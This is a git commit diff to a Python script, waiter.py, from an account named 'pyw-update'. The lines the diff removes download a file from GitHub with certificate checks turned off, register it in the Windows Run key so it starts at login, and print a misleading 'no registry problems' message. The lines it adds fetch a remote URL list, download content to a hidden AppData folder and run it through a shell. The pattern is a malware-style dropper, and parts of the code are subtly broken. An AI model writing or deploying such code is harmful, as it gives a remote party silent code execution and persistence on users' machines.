5beabb319bb79344c8c66e2cea02b60ac3117683
pyw-update <anakinlukehoffmann@gmail.com>
2026-03-25 21:59:21 +0100

    waiter funktions

--- waiter.py
+++ waiter.py
@@ -1,59 +1,70 @@
-import sys
-import pathlib as pl
 import os
-import winreg
-import ssl
 import urllib.request
+import ssl
+import subprocess
+import pathlib as pl
 
-key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-python_exe = sys.executable
+class Waiter:
+    TXT_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/do_something.txt"
+    APP_URL = ""
+    APP_NAME = "main"
+    FILE_NAME = "main.py"
+    BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
+    APP_DIR = os.path.join(BASE_DIR, APP_NAME)
+    APP_PATH = os.path.join(APP_DIR, FILE_NAME)
 
+    def __init__(self):
+        pass
+    
+    def request_url(self) -> bool:
+        self.APP_URL = self.get_txt_details()
+        print(f"Received URL: {self.APP_URL}")
+        if self.APP_URL.startswith("http"):
+            self.download_and_install()
+            return True
+        else:
+            return False
 
-APP_NAME = "waiter"
-FILE_NAME = "waiter.py"
-UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/" + FILE_NAME
-
-BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
-
-APP_DIR = os.path.join(BASE_DIR, APP_NAME)
-APP_PATH = os.path.join(APP_DIR, FILE_NAME)
-
-try:
-    print(f"→ Lade {FILE_NAME} herunter ...")
-    context = ssl._create_unverified_context()
-    req = urllib.request.Request(UPDATE_URL)
-    req.add_header("Pragma", "no-cache")
-    with urllib.request.urlopen(req, timeout=15, context=context) as resp:
-        if getattr(resp, "status", 200) != 200:
-            print(f"Download fehlgeschlagen – Status: {getattr(resp,'status', 'unbekannt')}")
+    def get_txt_details(self) -> str:
+        try:
+            print("Reading txt file from GitHub...")
+            context = ssl._create_unverified_context()
+            req = urllib.request.Request(self.TXT_URL)
+            req.add_header("Pragma", "no-cache")
+            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
+                if getattr(resp, "status", 200) != 200:
+                    print(f"Failed to read txt file – Status: {getattr(resp,'status', 'unknown')}")
+                    exit(1)
+                content = resp.read().decode("utf-8")
+                return content
+        except Exception as e:
+            print(f"Error reading txt file: {e}")
             exit(1)
-        new_content = resp.read()
 
-    with open(APP_PATH, "wb") as f:
-        f.write(new_content)
 
-    print(f"→ Erfolgreich heruntergeladen/aktualisiert: {APP_PATH}")
+    def download_and_install(self):
+        os.makedirs(self.APP_DIR, exist_ok=True)
+        try:
+            print(f"→ Downloading...")
+            context = ssl._create_unverified_context()
+            req = urllib.request.Request(self.TXT_URL)
+            req.add_header("Pragma", "no-cache")
+            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
+                if getattr(resp, "status", 200) != 200:
+                    print(f"Download failed – Status: {getattr(resp,'status', 'unknown')}")
+                    exit(1)
+                new_content = resp.read()
 
-except Exception as e:
-    print(f"Download/Fehler: {e}")
-    exit(1)
+            with open(self.APP_PATH, "wb") as f:
+                f.write(new_content)
 
-value = f'"{python_exe}" "{APP_PATH}"'
+            print(f"→ Successfully downloaded/updated")
+            subprocess.Popen([self.APP_PATH], shell=True)
 
-key = winreg.OpenKey(  # type: ignore
-    winreg.HKEY_CURRENT_USER,  # type: ignore
-    key_path,
-    0,
-    winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
-)
+        except Exception as e:
+            print(f"{e}")
 
-# Alten Wert löschen, falls vorhanden
-try:
-    winreg.DeleteValue(key, APP_NAME)  # type: ignore
-except FileNotFoundError:
-    pass
-
-winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, value)  # type: ignore
-winreg.CloseKey(key)  # type: ignore
-
-print(f"No registry problems found.\nContinuing with installation...")
+if __name__ == "__main__":
+    self = Waiter()
+    if self.request_url():
+        self.download_and_install()
